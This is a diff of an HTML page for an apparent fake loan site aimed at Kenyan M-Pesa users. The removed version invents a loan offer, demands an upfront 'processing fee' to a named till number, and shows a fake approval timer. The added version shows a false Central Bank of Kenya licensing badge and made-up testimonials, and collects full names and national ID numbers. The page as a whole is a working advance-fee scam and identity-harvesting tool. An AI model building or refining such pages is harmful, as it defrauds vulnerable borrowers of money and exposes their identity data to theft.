@@ -3,221 +3,164 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Loan Verification</title>
+  <title>Verify Your Details</title>
   <style>
     body {
-      margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #0f2027, #203a43, #2c5364);
-      color: #f1f1f1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+      margin: 0;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
       padding: 20px;
-      min-height: 100vh;
     }
+
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 12px;
+      padding: 20px;
+    }
+
     h1 {
-      font-size: 2em;
-      margin-bottom: 16px;
-      color: #e0f7fa;
-    }
-    .account-info {
-      background-color: rgba(17, 25, 40, 0.92);
-      padding: 25px 20px;
-      border-radius: 16px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
-      max-width: 460px;
-      width: 100%;
       text-align: center;
+      margin-bottom: 10px;
+      font-size: 1.5rem;
     }
-    .account-info h2 {
-      margin-top: 18px;
-      font-size: 1.3em;
-      color: #ffffff;
+
+    .trust-badge {
+      text-align: center;
+      margin-bottom: 20px;
     }
-    .account-info p {
-      margin: 10px 0;
-      color: #cfd8dc;
-      font-size: 1em;
+
+    .trust-badge img {
+      width: 100px;
+      height: auto;
     }
-    .message-box {
-      background: #1a2a33;
-      color: #a7ffeb;
-      padding: 15px;
-      border-radius: 10px;
-      font-size: 0.95em;
-      text-align: left;
-      margin-top: 15px;
-      line-height: 1.6;
-      max-height: 180px;
-      overflow-y: auto;
-      border-left: 4px solid #00e5ff;
+
+    .loan-info, .testimonials, .form-group, .terms {
+      margin-bottom: 20px;
     }
-    .thank-you {
-      font-weight: 600;
-      color: #69f0ae;
-      margin-top: 18px;
+
+    .loan-info span {
+      display: block;
+      margin-top: 5px;
+      font-weight: bold;
+      color: #00e5ff;
     }
-    ol {
-      margin-top: 12px;
-      text-align: left;
-      padding-left: 18px;
-      color: #b0bec5;
-      font-size: 0.9em;
-    }
-    textarea {
+
+    input {
       width: 100%;
-      height: 90px;
-      padding: 12px;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      margin-top: 5px;
+      font-size: 1rem;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(90deg, #00c6ff, #0072ff);
       border: none;
       border-radius: 8px;
-      background: #263238;
-      color: #80d8ff;
-      font-size: 0.95em;
-      resize: none;
-      margin-top: 16px;
-      box-shadow: inset 0 0 8px rgba(0, 188, 212, 0.3);
-    }
-    button {
-      margin-top: 14px;
-      padding: 12px 24px;
-      background: linear-gradient(to right, #00bcd4, #0097a7);
-      color: #fff;
-      border: none;
-      border-radius: 30px;
-      font-size: 1em;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 12px rgba(0, 188, 212, 0.3);
+      transition: 0.3s;
     }
+
     button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 20px rgba(0, 188, 212, 0.5);
+      opacity: 0.9;
     }
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      background: rgba(5, 10, 20, 0.92);
-      width: 100%;
-      height: 100%;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      font-size: 1.5em;
-      color: #ffffff;
-      z-index: 999;
+
+    .testimonial {
+      font-size: 0.9rem;
+      font-style: italic;
+      margin-bottom: 10px;
+      border-left: 3px solid #00e5ff;
+      padding-left: 10px;
     }
-    #timer {
-      margin-top: 10px;
-      color: #69f0ae;
-      font-size: 1.4em;
+
+    .terms {
+      font-size: 0.8rem;
+      text-align: center;
+      opacity: 0.8;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.3rem;
+      }
     }
   </style>
 </head>
 <body>
-  <h1>Loan Verification</h1>
-  <div class="account-info">
-    <p id="firstName">Hi: Loading...</p>
-    <p id="phoneNumber">Phone Number: Loading...</p>
-    <p id="loanDisplay">Loan Amount: Loading...</p>
-    <p id="savingDisplay">Processing Fee: Loading...</p>
-    <div class="message-box">
-      To demonstrate your commitment to the successful repayment of your loan,
-      our company requires a one-time processing fee based on the approved loan
-      amount, payable prior to disbursement. This fee ensures a smooth and efficient
-      loan process.
+  <div class="container">
+    <div class="trust-badge">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Coat_of_arms_of_Kenya_(Official).svg" alt="CBK Badge">
+      <p style="font-size: 0.9rem; margin-top: 5px;">Licensed by Central Bank of Kenya</p>
     </div>
 
-    <p class="thank-you">CLICK BELOW TO COPY TILL NUMBER TO DEPOSIT YOUR PROCESSING FEE</p>
-    <button id="copyButton">Copy Till Number: 9824375</button>
+    <h1>Verify Your Identity</h1>
 
-    <ol>
-      <li>Go to M-Pesa</li>
-      <li>Lipa na M-Pesa</li>
-      <li>Buy Goods and Services</li>
-      <li>Enter Till Number: 9824375</li>
-    </ol>
+    <div class="loan-info">
+      <p>You are eligible for:</p>
+      <span>Loan Amount: <span id="loanAmount">...</span></span>
+      <span>Service Fee: <span id="serviceFee">...</span></span>
+      <span>Disbursable: <span id="disbursable">...</span></span>
+    </div>
 
-    <textarea id="mpesaInput" placeholder="Paste your Mpesa transaction message here..."></textarea>
-    <button id="verifyButton">Verify</button>
-  </div>
+    <div class="form-group">
+      <label for="fullName">Full Name</label>
+      <input type="text" id="fullName" placeholder="Enter your full name" required />
 
-  <div class="overlay" id="overlay">
-    <p id="statusText">✅ Successful! Now Processing...</p>
-    <p>Time Remaining: <span id="timer">03:00</span></p>
+      <label for="idNumber">ID Number</label>
+      <input type="text" id="idNumber" placeholder="Enter your National ID number" required />
+    </div>
+
+    <button onclick="submitVerification()">Submit and Proceed</button>
+
+    <div class="testimonials">
+      <p class="testimonial">"Fast and reliable. Got my loan in minutes!" - Mercy W., Nairobi</p>
+      <p class="testimonial">"I trust this app. They are transparent and professional." - James M., Kisumu</p>
+    </div>
+
+    <div class="terms">
+      By submitting, you agree to our terms. All loans are subject to approval and verification.<br>
+      <strong>Loan repayment within 14 days.</strong>
+    </div>
   </div>
 
   <script>
-    let loanAmount = localStorage.getItem('targetValue');
-    if (!loanAmount) {
-      loanAmount = Math.floor(Math.random() * (15000 - 2000 + 1)) + 2000;
-      localStorage.setItem('targetValue', loanAmount);
-    }
-
-    let processingFee = localStorage.getItem('processingFee');
-    if (!processingFee) {
-      const amount = parseInt(loanAmount);
-      if (amount <= 4000) {
-        processingFee = Math.floor(Math.random() * (200 - 100 + 1)) + 100;
-      } else if (amount <= 8500) {
-        processingFee = Math.floor(Math.random() * (350 - 201 + 1)) + 201;
-      } else {
-        processingFee = Math.floor(Math.random() * (450 - 351 + 1)) + 351;
-      }
-      localStorage.setItem('processingFee', processingFee);
-    }
-
-    const firstName = localStorage.getItem('firstname') || "Unknown";
-    const phoneNumber = localStorage.getItem('phone') || "Not Available";
+    // Retrieve stored loan info
+    const loanAmount = localStorage.getItem("loanAmount") || "0";
+    const processingFee = localStorage.getItem("processingFee") || "0";
+    const disbursableAmount = localStorage.getItem("disbursableAmount") || "0";
 
     function formatNumber(num) {
-      return parseInt(num).toLocaleString();
+      return parseInt(num).toLocaleString('en-KE');
     }
 
-    document.getElementById('loanDisplay').textContent = 'Loan Amount: Ksh ' + formatNumber(loanAmount);
-    document.getElementById('savingDisplay').textContent = 'Processing Fee: Ksh ' + formatNumber(processingFee);
-    document.getElementById('firstName').textContent = "Account Name: " + firstName;
-    document.getElementById('phoneNumber').textContent = "Phone Number: " + phoneNumber;
+    document.getElementById("loanAmount").textContent = "Ksh " + formatNumber(loanAmount);
+    document.getElementById("serviceFee").textContent = "Ksh " + formatNumber(processingFee);
+    document.getElementById("disbursable").textContent = "Ksh " + formatNumber(disbursableAmount);
 
-    document.getElementById('copyButton').addEventListener('click', () => {
-      navigator.clipboard.writeText("9824375").then(() => {
-        alert("Till number copied to clipboard.");
-      });
-    });
+    function submitVerification() {
+      const name = document.getElementById("fullName").value.trim();
+      const id = document.getElementById("idNumber").value.trim();
 
-    document.getElementById('verifyButton').addEventListener('click', () => {
-      const message = document.getElementById("mpesaInput").value.trim();
-      const requiredName = "HAKIKA R PROVISION";
-      const requiredAmount = "Ksh" + processingFee + ".00";
-
-      if (message === "") {
-        alert("Please paste your Mpesa message.");
+      if (!name || !id) {
+        alert("Please fill in your name and ID number.");
         return;
       }
 
-      if (message.includes(requiredName) && message.includes(requiredAmount)) {
-        document.getElementById('overlay').style.display = "flex";
-        const randomDuration = Math.floor(Math.random() * (600 - 300 + 1)) + 300;
-        startTimer(randomDuration, document.getElementById('timer'));
-      } else {
-        alert(`Invalid M-Pesa message. Ensure it is paid to '${requiredName}' and the amount is exactly ${requiredAmount}.`);
-      }
-    });
+      // Save for next page or API submission
+      localStorage.setItem("userName", name);
+      localStorage.setItem("userID", id);
 
-    function startTimer(duration, display) {
-      let timer = duration, minutes, seconds;
-      const interval = setInterval(() => {
-        minutes = String(parseInt(timer / 60)).padStart(2, '0');
-        seconds = String(parseInt(timer % 60)).padStart(2, '0');
-        display.textContent = `${minutes}:${seconds}`;
-        if (--timer < 0) {
-          clearInterval(interval);
-          document.getElementById('statusText').textContent = "✅ Approved! Wait for M-Pesa message.";
-        }
-      }, 1000);
+      // Proceed (e.g., redirect to disbursement or confirmation)
+      window.location.href = "thank-you.html";
     }
   </script>
 </body>
